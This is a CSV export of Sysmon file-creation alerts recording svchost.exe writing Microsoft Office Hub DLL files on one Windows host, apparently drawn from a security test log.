"2025-12-26 11:29:12.024 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174922,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Hosting.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.020 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.020","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.025 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174923,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Hosting.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.022 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.022","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.025 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174924,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Http.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.022 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.022","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.025 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174925,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Http.Polly.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.022 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.022","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.025 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174926,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.Abstractions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.022 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.022","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.025 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174927,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.Configuration.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.024 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.024","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.025 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174928,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.Console.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.024 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.024","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.028 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174929,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.Debug.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.024 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.024","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.028 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174930,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.024 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.024","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.028 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174931,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.EventLog.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.026 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.026","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.028 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174932,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Logging.EventSource.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.026 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.026","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.029 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174933,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Options.ConfigurationExtensions.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.026 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.026","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.029 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174934,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Options.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.026 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.026","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.029 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174935,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Extensions.Primitives.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.028 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.028","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.031 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174936,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Graphics.Imaging.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.028 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.028","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.031 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174937,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.InteractiveExperiences.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.028 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.028","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.032 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174938,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Office.PrivacyGuard.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.030 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.030","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.032 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174939,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Office.Telemetry.EventFlags.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.030 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.030","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.034 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174940,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Security.Authentication.OAuth.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.030 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.030","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.034 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174941,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Toolkit.Win32.UI.XamlHost.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.032 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.032","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.034 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174942,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Unified.Telemetry.ContractsAndContextProviders.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.032 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.032","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.034 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174943,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Unified.Telemetry.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.032 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.032","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.037 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174944,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Unified.Telemetry.JsonSink.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.034 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.034","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.038 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174945,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Unified.Telemetry.OpenTelemetrySink.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.034 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.034","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.038 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174946,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Web.WebView2.Core.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.034 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.034","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.038 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174947,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Web.WebView2.Core.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.034 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.034","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.038 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174948,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Win32.SystemEvents.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.036 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.036","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.038 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174949,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AI.ContentSafety.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.036 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.036","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.039 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174950,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AI.Imaging.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.036 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.036","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.039 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174951,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AI.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.036 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.038","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.040 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174952,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AI.Text.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.038 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.038","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.040 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174953,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.ApplicationModel.Background.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.038 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.038","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.041 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174954,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.ApplicationModel.Background.UniversalBGTask.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.040 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.040","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.042 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174955,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.ApplicationModel.DynamicDependency.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.040 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.040","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.042 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174956,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.ApplicationModel.Resources.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.040 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.040","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.042 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174957,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.ApplicationModel.WindowsAppRuntime.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.042 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.042","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174958,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AppLifecycle.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.042 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.042","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:29:12.045 +01:00","File Created (Sysmon Alert)","med","DESKTOP-G2OBL3D","Sysmon",11,"","","sysmon",174959,"Rule: DLL ¦ Path: C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2512.53121.0_x64__8wekyb3d8bbwe\Microsoft.Windows.AppNotifications.Builder.Projection.dll ¦ Proc: C:\WINDOWS\system32\svchost.exe ¦ PID: 4356 ¦ PGUID: E9F06A57-5FEE-694E-6800-000000002400","CreationUtcTime: 2025-12-26 10:29:12.042 ¦ User: NT AUTHORITY\SYSTEM ¦ UtcTime: 2025-12-26 10:29:12.042","Sysmon_11_Med_FileCreated_RuleAlert.yml","c5e6b545-73a4-4650-ae97-67c239005382","C:\Tools\Logs\art_1071_004x.evtx"
